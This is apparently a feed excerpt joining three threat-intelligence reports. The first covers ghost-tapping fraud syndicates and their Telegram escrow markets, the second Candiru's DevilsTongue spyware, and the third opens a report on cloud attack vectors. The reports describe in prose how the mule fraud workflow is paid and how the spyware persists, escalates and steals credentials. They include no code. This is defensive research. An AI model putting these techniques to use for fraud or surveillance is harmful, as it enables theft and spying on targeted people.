        <p>On Xinbi Guarantee, we engaged with the threat actor “星马集团” (@xingma888; translates to “Singapore and Malaysian organization”), who is involved with laundering funds into physical goods and cashing out. Through our conversations, we identified that the threat actor is part of a Chinese-speaking ghost-tapping syndicate that operates in Singapore and Malaysia. This threat actor engagement sheds light on how Chinese-speaking syndicates operate and how platforms such as Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee facilitate ghost-tapping campaigns and other forms of cybercrime.</p>
        <div>
          <div>
            <div>
              <img loading="lazy" alt="" src="https://www.recordedfuture.com/media_15120c58058c1f667b615649323e08eaea056f63a.png?width=750&amp;format=png&amp;optimize=medium" width="1516" height="1122" />

          </div>
          <div>
            <div><strong><em>Figure 15:</em></strong> <em>@xingma888 is a member of Xinbi Guarantee and is open to using Xinbi, Huione, or Tudou Guarantee’s escrow service to deal with other Chinese-speaking threat actors (Source: Recorded Future)</em></div>
          </div>
        </div>
        <h4>Engagement</h4>
        <p>During an engagement, we learned that @xingma888 is able to supply a “motorcade” (车队) — mules for ghost-tapping campaigns to make in-person purchases at retail stores in Singapore and Malaysia. Threat actors requiring such services will have to specify what kind of physical goods they wish to obtain, and @xingma888 will quote the deposit amount required to mobilise the mules for the ghost-tapping campaign. The deposit amount must be paid in USDT to an escrow system belonging to either Huione, Tudou, or Xinbi Guarantee. In a manner similar to placing an order, the buyer has to provide a physical address for mules working for @xingma888 to deliver the physical goods. @xingma888 stated that after successfully delivering the goods, the buyer should take a video of the unboxing process and verify the authenticity of the items, then proceed to ask the customer service officer belonging to an escrow system of the buyer’s choice to release the amount of USDT to @xingma888.</p>
        <p>Taking into account details of multiple threat engagements with different cybercriminals involved in ghost-tapping campaigns, as well as open-source articles reporting about syndicates funding transportation costs and air tickets for mules, Insikt Group assesses with a high level of confidence that @xingma888 funds the following:</p>
        <ul>
          <li>Burner phones loaded with stolen payment card credentials</li>
          <li>Transportation costs, such as airline tickets for mules</li>
          <li>Accommodation for mules</li>
          <li>USDT or cash to recruit and pay mules</li>
          <li>A money mule to launder USDT into fiat currency</li>
        </ul>
        <p>Meanwhile, prospective buyers, which usually refers to Chinese syndicates, will be able to resell the physical goods bought via ghost-tapping campaigns for cash, successfully converting USDT into fiat currency through this cash-out method. In most cases, the prospective buyer will have to pay a greater amount of USDT to mule handlers such as @xingma888. We also assess that syndicates will likely need to recruit reseller mules to resell the physical goods for cash. Insikt Group has yet to factor in the cost of obtaining USDT in the first place, which is most likely obtained through illicit means involving cybercrime, illegal online gambling, and scams, where Southeast Asia is a hotbed for Chinese criminal gangs.</p>
        <p><strong>Figure 16</strong> illustrates how a Telegram-based escrow system, such as Xinbi Guarantee, helps to facilitate and mediate transactions between Chinese-speaking syndicates and mule controllers, such as @xingma888, looking to work together, as well as an overview of the financial gains each party receives during the process.</p>

        <h2>Mitigations</h2>
        <p>For banks and payment providers:</p>
        <ul>
          <li>Banks should introduce security measures to prevent payment card phishing fraud, such as a security feature that requires the individual to log in to their own bank account to authorize the linking of their payment card to a mobile wallet. This feature should turn off automatically if the card is not added to any mobile wallet within a designated short time frame.</li>
          <li>Card issuers should consider alternatives to SMS- or email-based OTPs for device wallet authentication and activation. These may include automated or “manned” calls with customer service or push provisioning from the issuer’s official mobile application, which are less susceptible to phishing.</li>
          <li>In scenarios where SMS- or email-based OTPs are still used, card issuers should consider placing the OTP in the second half of messages and excluding it from preview text on mobile home screens, increasing the chance that a cardholder notices suspicious activity.</li>
          <li>Analyze device risk factors before allowing a payment card to be added to a digital wallet. Enforce stricter authentication when a card is being added from an unrecognized device or location.</li>
          <li>Flag transactions where the same payment card is used in geographically distant locations within an unrealistic timeframe.</li>
          <li>Analyze patterns where multiple cards are linked to the same device, particularly following known phishing incidents.</li>
          <li>Leverage machine learning models to recognize the characteristics of relayed payments and device behavior anomalies related to NFC relay fraud.</li>
          <li>Allow customers to verify high-risk transactions or digital wallet provisioning attempts via their banking app before finalizing them.</li>
        </ul>
        <p>For consumers:</p>
        <ul>
          <li>Individuals should contact their respective banking institutions and block their access to their compromised payment cards as soon as they receive notifications of unauthorized use.</li>
          <li>Individuals should not download third-party mobile applications outside official App stores.</li>
          <li>Individuals should not add payment card information to any unknown or untrustworthy websites and should not share any OTPs or PINs with anyone. Changing their payment card PIN regularly and monitoring payment card transactions can help reduce the chance of payment card phishing.</li>
          <li>Individuals should be wary of scammers impersonating bank personnel and should contact the bank through their official banking hotline to obtain and clarify information regarding their own banking matters.</li>
        </ul>
        <p>For law enforcement:</p>
        <ul>
          <li>Collaborate with payment networks, financial institutions, and digital platforms to identify and track emerging trends related to NFC relay fraud and payment card phishing.</li>
          <li>Support efforts to dismantle infrastructure used to distribute phishing kits and mobile malware used in payment credential theft schemes.</li>
        </ul>
        <h2>Outlook</h2>
        <p>Insikt Group believes that Chinese-speaking syndicates are pivoting toward using ghost-tapping as an attack vector to commit retail fraud and launder funds from goods purchased with compromised payment cards. We assess that ghost-tapping criminals can capitalize on data breaches belonging to banks and telecommunications firms to obtain PII and use social engineering techniques to steal payment card information via phishing. Data breaches of telecommunications companies involving databases belonging to customers may increase the risk of SIM swapping, where cybercriminals can potentially add, link, and authenticate payment card information remotely to burner phones.<br /><br />Despite the shutdown of Huione Guarantee’s operations on May 13, 2025, we observed cybercriminals quickly pivoting toward alternative Telegram-based escrow systems such as Xinbi Guarantee and Tudou Guarantee. These platforms continue to empower cybercriminals to conduct transactions and recruit mules for ghost-tapping operations. Due to these marketplaces being criminal sources and claiming to be a trusted platform, there remains the possibility of them ceasing operations, like Huione Guarantee, while events such as Telegram clamping down on channels linked to these two platforms can temporarily disrupt ghost-tapping campaigns. If these two marketplaces were to cease operations, Chinese-speaking syndicates would likely pivot to different platforms that have stronger operation security measures, which could result in less visibility for researchers and law enforcement agencies to monitor ghost-tapping-related intelligence.</p>
        <p>Success in ghost-tapping campaigns will bring about more financial resources to both syndicates and cybercriminals. Ghost-tapping is likely going to <a href="https://www.cleafy.com/cleafy-labs/supercardx-exposing-chinese-speaker-maas-for-nfc-relay-fraud-operation">expand</a> globally, with threat actors offering custom-built tooling to tailor to non-Chinese speaking syndicates and regional operations. Conversely, if banks around the world introduce more stringent measures to prevent payment card phishing fraud in a manner similar to <a href="https://www.dbs.com/newsroom/DBS_introduces_new_Mobile_wallets_security_feature_to_further_protect_customers_from_phishing_frauds">DBS’s security feature</a>, the overall success rate of linking compromised payment card credentials to any contactless payment system would be lowered.</p>

            <description><![CDATA[Recorded Future's Insikt Group uncovers active infrastructure linked to Candiru’s DevilsTongue spyware across multiple countries. Discover how this stealthy spyware targets high-value individuals and evades detection.]]></description>
            <content:encoded><![CDATA[
        <p>Note: The analysis cut-off date for this report was June 26, 2025</p>
        <h2>Executive Summary</h2>
        <p>Insikt Group identified new infrastructure associated with several clusters linked to the spyware vendor Candiru. This includes both victim-facing components likely used for deploying and controlling Candiru’s DevilsTongue spyware, as well as higher-tier operator infrastructure. DevilsTongue is a sophisticated, modular Windows malware. The clusters vary in design and administration, with some directly managing victim-facing systems, while others use intermediaries or the Tor network. Eight distinct clusters were identified, with five being likely still active, including those linked to Hungary and Saudi Arabia. One cluster tied to Indonesia was active until November 2024, and two associated with Azerbaijan have uncertain status due to a lack of identified victim-facing infrastructure. Insikt Group also identified a company suspected to be part of Candiru’s corporate network</p>
        <p>The use of mercenary spyware like DevilsTongue, both domestically and internationally, outside of serious crime or counterterrorism contexts, poses serious privacy, legal, and safety risks to targets, their organizations, and even the operators. Due to the high cost per deployment (based on researchers’ assessments of leaked sales information), individuals with high intelligence value, such as politicians, business leaders, and individuals in sensitive roles, are often particularly at risk. Despite regulatory and legal efforts worldwide, including the US Department of Commerce adding Candiru to its <a href="https://www.commerce.gov/news/press-releases/2021/11/commerce-adds-nso-group-and-other-foreign-companies-entity-list">Entity List</a>, the EU's resolution to curb spyware abuse, and the UK- and France-led Pall Mall initiative to define and regulate legitimate use, Candiru has proven resilient, pushing back by trying to get removed from the entity list, for example, and continues to pose a significant threat.</p>
        <p>In the short term, defenders should implement security best practices, including regular software updates, hunting for known indicators, pre-travel security briefings, and strict separation of personal and corporate devices. These measures should be supported by ongoing employee security awareness training to enhance understanding of infection vectors and malware capabilities and promote a culture of minimal data exposure. In the long term, organizations should invest in thorough risk assessments to inform more nuanced and adaptive security policies.</p>
        <p>As the mercenary spyware market grows, with new vendors, products, and more countries seeking advanced cyber capabilities, the risk of being targeted now extends beyond civil society to anyone of interest to actors with access to such tools or their equivalents. At the same time, sustained profitability, rising competition, and stronger IT defenses are fueling innovation, as evidenced by alleged ad-based infections, direct attacks on messaging servers, and enhanced persistence (<a href="https://www.theregister.com/2023/09/16/insanet_spyware/#:~:text=To%20market%20its%20snoopware%2C%20Insanet%20reportedly%20teamed,euros%20($6.7%20million%2C%20%C2%A35.2%20million)%2C%20mind%20you.&amp;text=Unsuspecting%20users%20are%20definitely%20susceptible%20to%20such%20attacks.%22">1</a>, <a href="https://citizenlab.ca/2025/06/first-forensic-confirmation-of-paragons-ios-mercenary-spyware-finds-journalists-targeted/">2</a>, <a href="https://blog.talosintelligence.com/intellexa-and-cytrox-intel-agency-grade-spyware/">3</a>). These trends are driving stealthier infection chains, targeting of cloud backups, a more professionalized spyware ecosystem, and broader tool portfolios. Effective mitigation, therefore, requires continuous ecosystem monitoring, thorough risk assessment, and stronger regulatory action from policymakers.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>Insikt Group has identified new infrastructure linked to several operational clusters associated with Candiru, an Israeli-based spyware vendor. This infrastructure includes both victim-facing components likely used in the deployment and C2 of Candiru’s DevilsTongue spyware, and higher-tier infrastructure used by the spyware operators.</li>
          <li>Using Recorded Future Network Intelligence, Insikt Group identified significant differences in infrastructure design and administrative practices across the clusters. While some clusters manage their victim-facing infrastructure directly, others do so through intermediary infrastructure layers or via the Tor network.</li>
          <li>Eight distinct clusters were identified. Five are assessed as highly likely to be currently active, including ones associated with Hungary and Saudi Arabia. One cluster, highly likely linked to a customer based in Indonesia, was active until November 2024, while two others, associated with Azerbaijan, remain of uncertain status.</li>
          <li>Insikt Group also identified a separate company suspected to be part of Candiru’s broader corporate network. This entity was established around the same time Candiru’s assets were acquired by a US-based company, suggesting it may have played a role in the acquisition process</li>
        </ul>
        <h2>Background</h2>
        <h3>Candiru, the Company</h3>
        <p>Candiru Ltd., now operating as Saito Tech Ltd., is an Israeli company that was founded in 2014 by Eran Shorer and Yaakov Weizmann. The company's original name, Candiru, <a href="https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/">draws</a> from a notorious parasitic fish known for its stealth and invasiveness, a metaphor for the company’s spyware capabilities. Isaac Zack, an early investor in NSO Group, was <a href="https://archive.ph/Syr70">reported</a> to be serving as Candiru’s chairman. The company reportedly secured funding from the Founders Group, an angel syndicate co-founded by Omri Lavie and Shalev Hulio, the co-founders of NSO Group. Activity linked to the company is also <a href="https://www.microsoft.com/en-us/security/blog/2021/07/15/protecting-customers-from-a-private-sector-offensive-actor-using-0-day-exploits-and-devilstongue-malware/">tracked</a> under the alias SOURGUM by Microsoft. In this report, Insikt Group uses the name Candiru, as this is the most widely known name for the company.</p>
        <p>Over time, Candiru has frequently relocated its offices and restructured its corporate registration to maintain operational secrecy (see Figure 1).</p>

            <div><strong><em>Figure 1:</em></strong> <em>Timeline of Candiru’s corporate registrations (Source: Recorded Future, derived from</em> <em><a href="https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/">Citizen Lab</a>)</em></div>
          </div>
        </div>
        <p>Court filings from a lawsuit <a href="https://archive.ph/Syr70">brought</a> by a former senior employee revealed that Candiru grew from 12 employees in 2015 to 70 by 2018. The company began securing contracts with government clients across Europe, the Middle East, Asia, and Latin America as early as 2016. That same year, it reportedly generated $10 million in revenue, which increased to $20–30 million by 2018, with an additional $367 million in pending deals involving 60 government clients. Negotiations were often conducted through local intermediaries.</p>
        <p>In 2017, Candiru is believed to have <a href="https://archive.ph/Syr70">started</a> developing spyware for mobile devices, a development later confirmed by Israeli newspaper Haaretz, based on leaked internal documents. That same year, Candiru <a href="https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/">re-registered</a> as DF Associates Ltd. (ד. אפ אסוסיאייטס בעיימ).</p>
        <p>In 2018, the company <a href="https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/">rebranded</a> to Grindavik Solutions Ltd. (גרינדוויק פתרונות בעיימ).</p>
        <p>By 2019, Candiru was valued at approximately $90 million, following the sale of a 10% equity stake by venture capitalist Eli Wartman to Universal Motors Israel (UMI). Reports also suggest investment from the Qatari sovereign wealth fund. That same year, Vice News <a href="https://www.vice.com/en/article/uzbekistan-hacking-operations-uncovered-due-to-spectacularly-bad-opsec/">reported</a> that Kaspersky Lab had identified Candiru spyware in use by the Uzbekistan State Security Service (SSS). The SSS had reportedly used Kaspersky antivirus software to test the spyware's stealth and had configured an official government domain ("itt[.]uz") for its C2 communications. This leak led to the identification of other Candiru clients, including Saudi Arabia and the United Arab Emirates (UAE). The company <a href="https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/">renamed</a> itself to Taveta Ltd. (טאבטה בעיימ) in 2019 as well.</p>
        <p>In 2020, the company created a subsidiary named Sokoto. That same year, Candiru’s board included founders Shorer and Weizmann, chairman Isaac Zack, and a representative from Universal Motors Israel. Candiru also <a href="https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/">changed</a> its <a href="https://www.kycisrael.com/companies/515126605/saito-tech-ltd/">name</a> to Saito Tech Ltd. (סאייטו טק בעיימ).</p>
        <p>By 2021, company filings listed Universal Motors Israel, ESOP Management and Trust Services Ltd. (which manages employee stock ownership programs), and Optas Industry Ltd. (a proxy for the Qatari fund) as minority shareholders.</p>
        <p>In April 2021, cybersecurity firm ESET <a href="https://www.welivesecurity.com/2021/11/16/strategic-web-compromises-middle-east-pinch-candiru/">uncovered</a> an espionage operation using Candiru spyware in a watering hole attack targeting the UK news outlet Middle East Eye, news outlets associated with the Houthis and Hezbollah, and a likely dissident media outlet in Saudi Arabia. Additional victims included the websites of an Iranian embassy, Italian and South African aerospace firms, and Syrian and Yemeni government websites.</p>
        <p>In July 2021, Citizen Lab and Microsoft <a href="https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/">revealed</a> that Candiru’s spyware had been widely <a href="https://www.microsoft.com/en-us/security/blog/2021/07/15/protecting-customers-from-a-private-sector-offensive-actor-using-0-day-exploits-and-devilstongue-malware/">deployed</a> by multiple government clients, compromising at least 100 victims globally. The targets <a href="https://blogs.microsoft.com/on-the-issues/2021/07/15/cyberweapons-cybersecurity-sourgum-malware/">included</a> politicians, human rights defenders, journalists, academics, embassy staff, and political dissidents. Microsoft reported that approximately half of the victims it observed were located in Palestine. The remaining victims were in Israel, Iran, Lebanon, Yemen, Spain (Catalonia), the United Kingdom, Türkiye, Armenia, and Singapore. The spyware's infrastructure was traced to several countries, including Saudi Arabia, Israel, the UAE, Hungary, and Indonesia. The domains <a href="https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/">used</a> by Candiru also give a hint to the targets. Domains spoofed international media, advocacy organizations (including Black Lives Matter, Amnesty International, and Refugees International), gender studies events (including a conference on the topic), and international organizations (including the Office of the Special Envoy of the Secretary-General for Yemen, the UN, and the WHO).</p>
        <p>In November 2021, the US Department of Commerce <a href="https://www.commerce.gov/news/press-releases/2021/11/commerce-adds-nso-group-and-other-foreign-companies-entity-list">added</a> both Candiru and NSO Group to its Entity List, citing their role in supplying spyware to foreign governments engaged in malicious activities.</p>
        <p>In April 2022, Citizen Lab reported that members of the Catalan independence movement had been targeted with Candiru spyware as part of a domestic surveillance operation authorized by the Spanish government (see Figure 2). The campaign reportedly included surveillance of elected officials and political activists. Candiru specifically was used to target four Catalans working in the open-source and digital voting communities. One Catalan technologist, Elies Campo, was <a href="https://citizenlab.ca/2022/04/catalangate-extensive-mercenary-spyware-operation-against-catalans-using-pegasus-candiru/#finding-catalans-targeted-with-candiru">sent</a> an email with a link that, if clicked, would have led to a Candiru infection while he resided in the US and had a US SIM card in his device. Additionally, Citizen Lab reported on <a href="https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/">suspected</a> targeting of Saudi Arabian social media users.</p>

        <h3>Suspected New Company After Acquisition</h3>
        <p>In April 2025, the technology news outlet CTech <a href="https://www.calcalistech.com/ctechnews/article/r1er11mi61e">reported</a> that Candiru had been acquired several months earlier by Integrity Partners in a $30 million deal. Notably, Integrity Partners, an American investment firm whose partners include Elad Yoran (brother of Amit Yoran, former CEO of Tenable), had also previously <a href="https://www.reuters.com/world/middle-east/israels-nso-group-says-talks-with-us-funds-over-possible-deal-2022-01-26/">placed</a> a bid to acquire Pegasus spyware developer NSO Group.</p>
        <p>The reporting <a href="https://www.calcalistech.com/ctechnews/article/r1er11mi61e">indicates</a> that Integrity Partners acquired Candiru’s assets and transferred them, along with all company employees, to a newly <a href="https://www.calcalistech.com/ctechnews/article/r1er11mi61e">established</a> entity not currently subject to US government sanctions. By the time of the report, the first phase of the agreement had already been <a href="https://www.calcalistech.com/ctechnews/article/r1er11mi61e">completed</a>, involving the transition of employees to the new entity for $10 million. The second phase, which entails the transfer of Candiru’s export licenses, will be finalized once the necessary approvals are secured.</p>
        <p>Notably, WHOIS records associated with Nerfwall, an alias <a href="https://storage.googleapis.com/gweb-uniblog-publish-prod/documents/Buying_Spying_-_Insights_into_Commercial_Surveillance_Vendors_-_TAG_report.pdf">linked</a> to Candiru, led Insikt Group to identify the domain integrity-labs[.]ltd, registered on March 31, 2025. In this context, Insikt Group also <a href="https://www.kycisrael.com/companies/517081089/integrity-labs-ltd/">identified</a> a private Israeli company named Integrity Labs Ltd (אינטגריטי לאבס בע~מ), incorporated on December 18, 2024, under company number 517081089 and based in Herzliya, Israel. The company is directed by Naftali Yoran based on corporate report records attained by Recorded Future. Open-source reporting <a href="https://www.intelius.com/people-search/naftali-yoran/">indicates</a> that Elad Yoran is also known as Naftali Yoran.</p>
        <h3>Licensing Model</h3>
        <p>A leaked Candiru project proposal <a href="https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/">published</a> by TheMarker, an Israeli news outlet, suggests that, similar to other spyware vendors like Intellexa, Candiru licenses its spyware according to the number of concurrent infections, which refers to the number of targets that can be actively monitored at any given moment. For example, one €16 million proposal allows for unlimited infection attempts but limits monitoring to ten devices simultaneously. Customers can expand this capacity: for an additional €1.5 million, they can monitor fifteen more devices and gain authorization to target one additional country; for €5.5 million, they can monitor 25 more devices and operate in five additional countries (see Figure 3). Another €1.5 million upgrade offers a remote shell capability, granting full command-line access to infected devices, raising particular concern due to its potential use for uploading files or planting incriminating content.</p>

          </div>
        </div>
        <p>The leaked proposal further states that the product is intended to operate solely within “agreed upon territories,” explicitly listing the US, Russia, China, Israel, and Iran as restricted countries. Despite these limitations, Microsoft has <a href="https://www.microsoft.com/en-us/security/blog/2021/07/15/protecting-customers-from-a-private-sector-offensive-actor-using-0-day-exploits-and-devilstongue-malware/">identified</a> Candiru victims in Iran and Israel, indicating that the spyware may, in certain cases, be deployed beyond its officially sanctioned regions. Corroborating this, the targeting infrastructure analyzed in Citizen Lab’s report from 2021 <a href="https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/">includes</a> domains impersonating the Russian postal service. That report also details the targeting of a Catalan technologist while he was living in the US, as mentioned above.</p>
        <h3>DevilsTongue</h3>
        <p>DevilsTongue, the name given by Microsoft to the Windows-based spyware developed by Candiru, is a complex, modular, multi-threaded malware written in C and C++ with a wide range of capabilities. Most of what is known about DevilsTongue stems from Microsoft's analysis and a leaked Candiru project proposal published by TheMarker. However, given the extensive list of suspected components and features, and the age of both reports, Insikt Group assesses that the malware's capabilities have likely evolved since then.</p>
        <p>The leaked documents reveal that Candiru’s spyware was designed for deep access to victim devices, enabling file extraction, browser data collection, and even the theft of encrypted messages from the Signal Messenger desktop app. Figure 4 presents an excerpt from the leaked Candiru project proposal outlining the spyware’s Windows-specific capabilities.</p>

          </div>
        </div>
        <p>According to Microsoft’s detailed analysis, DevilsTongue is a stealthy malware with both user- and kernel-mode components. It maintains persistence via COM hijacking by overwriting a legitimate COM class registry key’s DLL path with a first-stage DLL dropped in C:\Windows\system32\IME\, and it stores encrypted second-stage payloads in the configuration directory. A signed third-party driver (physmem.sys) enables kernel-level memory access and API call proxying to avoid detection. To preserve system stability, DevilsTongue reinjects the original COM DLL during hijacking, disguising this action through shellcode manipulation of the LoadLibraryExW return value. All additional payloads are decrypted and executed only in memory, allowing the malware to steal credentials from LSASS and browsers, access Signal messages, and use browser cookies to impersonate victims on platforms like Facebook, Gmail, and VK. The malware’s use of scrubbed metadata, encryption, and unique hashes for each file further complicates detection and analysis.</p>
        <h4>Overlap with CHAINSHOT</h4>
        <p>CHAINSHOT is an exploit kit that has previously been <a href="https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/">associated</a> with Candiru. It has been observed in use by threat actor groups such as Stealth Falcon and SandCat, the latter believed to be linked to the Uzbek government. SandCat drew significant attention in 2019 due to a series of <a href="https://www.vice.com/en/article/uzbekistan-hacking-operations-uncovered-due-to-spectacularly-bad-opsec/">operational security errors</a> that not only exposed multiple zero-day vulnerabilities but also enabled direct attribution to Uzbekistan’s State Security Service (SSS). Notably, another threat actor known as PuzzleMaker has also been <a href="https://securelist.com/puzzlemaker-chrome-zero-day-exploit-chain/102771/">mentioned</a> in connection with CHAINSHOT, due to the use of a rare but likely not exclusively used technique. Although the connection between CHAINSHOT and Candiru was initially circumstantial, researchers at Citizen Lab later established a clearer link. They identified a shared fingerprint, including a matching IP address, that tied CHAINSHOT’s final spyware delivery URL to infrastructure <a href="https://unit42.paloaltonetworks.com/unit42-slicing-dicing-cve-2018-5002-payloads-new-chainshot-malware/">documented</a> in a 2018 report by Palo Alto Networks, thereby reinforcing the association between CHAINSHOT and Candiru.</p>
        <h3>Initial Access Vectors</h3>
        <p>According to the leaked materials discussed above, Candiru’s spyware can be <a href="https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/">deployed</a> through multiple vectors, including malicious links, weaponized files, man-in-the-middle (MitM) attacks, and physical access. However, based on Insikt Group’s current knowledge, public reporting has only confirmed the use of the first two vectors in documented cases involving Candiru-related infections, although it is highly likely that the other vectors have also been employed. When it comes to malicious links, Candiru has used both actor-controlled links, such as spearphishing emails and strategic website compromises known as watering hole attacks, to deliver its spyware, with infections typically involving exploits that target web browsers (<a href="https://blog.google/threat-analysis-group/how-we-protect-users-0-day-attacks/">1</a>, <a href="https://decoded.avast.io/janvojtesek/the-return-of-candiru-zero-days-in-the-middle-east/">2</a>).</p>
        <p>For instance, Google’s Threat Analysis Group (TAG) <a href="https://blog.google/threat-analysis-group/how-we-protect-users-0-day-attacks/">disclosed</a> in 2021 that two Google Chrome renderer remote code execution zero-day vulnerabilities (CVE-2021-21166 and CVE-2021-30551) had been exploited by Candiru. These exploits were distributed via single-use links sent to specific targets, who were believed to be located in Armenia. The links directed recipients to attacker-controlled domains impersonating legitimate websites relevant to the victims’ interests. Google TAG discovered that CVE-2021-21166 also affected WebKit, prompting Apple to patch it as CVE-2021-1844; however, there is no evidence it was used against Safari users.</p>
        <p>In April 2021, Google TAG <a href="https://blog.google/threat-analysis-group/how-we-protect-users-0-day-attacks/">identified</a> a campaign targeting Armenian users with malicious Office documents that loaded web content through Internet Explorer. This was achieved either by embedding a remote ActiveX object using a Shell.Explorer.1 OLE object or by launching an Internet Explorer process via VBA macros to navigate to a web page. Following a fingerprinting phase, targets were served an Internet Explorer zero-day exploit, later assigned CVE-2021-33742 and patched by Microsoft in June 2021. TAG’s analysis indicates that the Internet Explorer exploits were developed and supplied by the same entity responsible for the previously mentioned Google Chrome exploits.</p>
        <p>In July 2022, Avast <a href="https://decoded.avast.io/janvojtesek/the-return-of-candiru-zero-days-in-the-middle-east/">reported</a> that CVE-2022-2294, a high-severity heap buffer overflow vulnerability in WebRTC within Google Chrome, was exploited to execute shellcode in the browser’s renderer process, targeting users in the Middle East. The exploit, designed specifically for Windows, was likely combined with a sandbox escape, though the second-stage exploit could not be recovered. In Lebanon, the attackers compromised a website used by employees of a news agency, which contained signs of persistent cross-site scripting (XSS) attacks, likely as part of their testing phase, before ultimately injecting malicious JavaScript from an attacker-controlled domain. This injected code selectively redirected intended victims through a chain of attacker-controlled domains to the exploit server. Prior to Avast’s report, ESET had <a href="https://www.eset.com/gr-en/about/newsroom/press-releases-1/eset-research-discovers-watering-hole-attacks-on-websites-in-the-middle-east-with-links-to-candiru-s/">reported</a> on strategic web compromises across the Middle East, with a strong focus on Yemen, that they attributed to Candiru with medium confidence.</p>
        <p>Beyond the previously mentioned vectors, reports from 2023 <a href="https://www.theregister.com/2023/09/16/insanet_spyware/#:~:text=To%20market%20its%20snoopware%2C%20Insanet%20reportedly%20teamed,euros%20($6.7%20million%2C%20%C2%A35.2%20million)%2C%20mind%20you.&amp;text=Unsuspecting%20users%20are%20definitely%20susceptible%20to%20such%20attacks.%22">indicate</a> that Candiru also possessed a capability known as Sherlock. Sherlock is a commercial surveillance capability <a href="https://www.haaretz.com/israel-news/2023-09-14/ty-article-magazine/.highlight/revealed-israeli-cyber-firms-developed-an-insane-new-spyware-tool-no-defense-exists/0000018a-93cb-de77-a98f-ffdf2fb60000">developed</a> by the Israeli software maker Insanet that is capable of infecting devices running Windows, Android, and iOS. Unlike traditional spyware that exploits software vulnerabilities, Sherlock <a href="https://cyberjustice.blog/2024/01/22/sherlock-the-terrifying-israeli-spyware-surpassing-pegasus/">leverages</a> programmatic advertising to deliver its payload. By placing malicious ads through ad exchanges, it can target specific individuals based on demographics and location, leading to the covert installation of spyware when the ad is displayed on a user's device.</p>

            <description><![CDATA[Explore top cloud threats in 2025. Learn how attackers exploit misconfigurations, credentials, and native tools—and how to defend cloud environments.]]></description>
            <content:encoded><![CDATA[
        <h2>Executive Summary</h2>
        <p>In a review of recently observed attack methods, Insikt Group identified five attack vectors that currently pose the greatest potential threat to cloud environments. Three of these attack methods, vulnerability exploitation, endpoint misconfiguration, and credential abuse leading to account takeover, can grant threat actors initial access. In certain circumstances, these three attack methods can also be employed following initial access to gain increased permissions within a cloud environment, modify the cloud environment, and allow lateral movement, either to additional cloud environments, traditional on-premise environments, or user devices. The two remaining attack methods, cloud abuse and cloud ransomware, demonstrate impact actions threat actors can perform within a cloud environment.</p>
        <p>Hunting for each of these threats often requires the implementation of robust logging within cloud environments to ensure that data such as network communications, user access, and cloud service usage metrics can be readily accessed and scrutinized for aberrations. Log data assists in both proactive discovery of suspicious activity originating at the edge of cloud environments, such as in instances where misconfiguration and vulnerability scanning occur, and in identifying instances where cloud accounts and resources are abused for malicious purposes.</p>
        <p>To mitigate threats from impacting cloud environments, proper configuration of the environment is paramount, both at the edge of the cloud environment, including the methods by which users and services interact with the environment, and within the environment itself. Cloud environments that are configured appropriately minimize the risk of initial access and can significantly limit the malicious actions a threat actor is capable of performing post-initial access. Additionally, the most common cloud platforms provide native services focused on security for cloud environments, such as web application firewalls (WAF), identity and access management (IAM) services, secrets storage and management suites, and secure data connectors for hybridized cloud environments, that allow cloud architects to mitigate the threats discussed in this report with relative ease</p>
        <h2>Key Findings</h2>
        <ul>
          <li>Most initial compromises start with exposed or misconfigured cloud endpoints, with attackers using open‑source scanners to identify misconfigured endpoints.</li>
          <li>Stolen or weak credentials, often gathered from initial access brokers (IABs) and previous malicious actions performed by the attacker, remain the fastest path to full‑tenant cloud takeover.</li>
          <li>Threat actors increasingly abuse legitimate SaaS and IaaS resources, shifting costs to the owners of victimized environments and abusing resources to complicate the detection of follow-on malicious actions, such as phishing campaigns.</li>
          <li>Ransomware groups have adopted cloud‑native tactics, encrypting S3 and Azure storage directly and disabling backups to maximize leverage.</li>
          <li>Hybrid infrastructure lets attackers pivot seamlessly between on‑premise and multi‑cloud environments, so visibility and controls must extend beyond the cloud environment to the devices and services that access it.</li>
        </ul>
        <h2>Introduction</h2>
        <p>During the past decade, a steady shift from traditional on-premise IT infrastructure to cloud-based infrastructure and hybrid cloud infrastructure has taken place. According to PwC’s <a href="https://www.pwc.com/us/en/services/audit-assurance/private-company-services/library/cloud-technology.html">2023 Cloud Business Survey</a>, 39% of private respondents stated that the entirety of their operations had been moved to cloud environments. Cloud computing has become a trusted and integral part of many corporations’ day-to-day operations. Since the time of PwC’s reporting, cloud computing as an industry has only grown with no signs of slowing.</p>
        <p>The breadth of cloud products and the depth of services provided by cloud environments continue to grow daily. In a joint <a href="https://www.aboutamazon.com/news/aws/ai-cloud-adoption-economic-impact-gdp-aws">study</a> conducted by Amazon and Telecom Advisory Services, cloud adoption accounted for a total of $1 trillion in the global gross domestic product, with a projected increase to $12 trillion between 2024 and 2030. This estimate indicates that traditional computing environments will continue to migrate to cloud environments rapidly in the coming years. That demand for cloud computing resources will continue to increase for the foreseeable future.</p>
        <p>The success of cloud computing can be squarely attributed to the benefits that adopters are provided. When properly configured, cloud environments allow their adopters to shift costs associated with traditional on-premise environments, create high-availability to remote assets, and eliminate development overhead by gaining access to managed services. As cloud providers continue to offer additional services and products that make similar offerings for traditional environments less effective from cost and operational perspectives, cloud adoption will only continue to grow in the future.</p>
        <h2>Background</h2>
